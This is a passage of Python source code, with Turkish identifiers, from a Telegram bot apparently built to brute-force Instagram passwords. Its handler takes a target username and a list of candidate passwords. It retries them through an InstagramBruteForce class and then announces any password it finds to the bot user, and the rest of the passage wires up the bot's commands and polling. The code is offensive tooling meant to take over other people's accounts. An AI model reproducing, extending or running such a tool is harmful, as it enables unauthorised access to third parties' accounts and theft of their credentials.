    async def potansiyel_sifreleri_tekrar_dene(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        sorgu = guncelleme.callback_query
        await sorgu.answer()
        kullanici_id = sorgu.from_user.id
        
        potansiyel_sifreler = baglam.user_data.get('potansiyel_sifreler', [])
        kullanici_adi = baglam.user_data.get('kullanici_adi')
        
        if not kullanici_adi:
            await sorgu.message.reply_text("❌ Kullanıcı adı bulunamadı! Lütfen /baslat ile yeniden başlayın.")
            return
        
        if not potansiyel_sifreler:
            await sorgu.message.reply_text("❌ Tekrar denenecek şifre bulunamadı!")
            return
        
        await sorgu.message.reply_text(f"🔄 Potansiyel şifreler tekrar deneniyor...\nHedef: {kullanici_adi}\nŞifre Sayısı: {len(potansiyel_sifreler)}")
        
        instagram_kaba_kuvvet = InstagramBruteForce()
        
        async def ilerleme_geri_donusu(mesaj, yanit_isareti=None):
            try:
                await sorgu.message.reply_text(mesaj, reply_markup=yanit_isareti)
                logger.info(f"Mesaj gönderildi: {mesaj}")
                await asyncio.sleep(0.5)
            except TelegramError as e:
                logger.error(f"Telegram hatası: {e}")
                await sorgu.message.reply_text(f"⚠️ Telegram hatası: {str(e)}")
        
        sonuc = await instagram_kaba_kuvvet.kaba_kuvvet(
            kullanici_adi,
            potansiyel_sifreler,
            ilerleme_geri_donusu,
            baglam
        )
        
        if sonuc:
            await sorgu.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {sonuc}")
            baglam.user_data.pop('potansiyel_sifreler', None)
            baglam.user_data.pop('kullanici_adi', None)

def main():
    uygulama = Application.builder().token(TOKEN).build()
    bot = TelegramBot()
    
    uygulama.add_handler(CommandHandler("baslat", bot.baslat))
    uygulama.add_handler(CallbackQueryHandler(bot.buton))
    uygulama.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.mesaj_isle))
    uygulama.add_handler(MessageHandler(filters.Document.ALL, bot.mesaj_isle))
    
    logger.info("Bot başlatılıyor...")
    try:
        uygulama.run_polling()
    except Exception as e:
        logger.error(f"Bot başlatılırken hata: {e}")

if __name__ == '__main__':
    main()
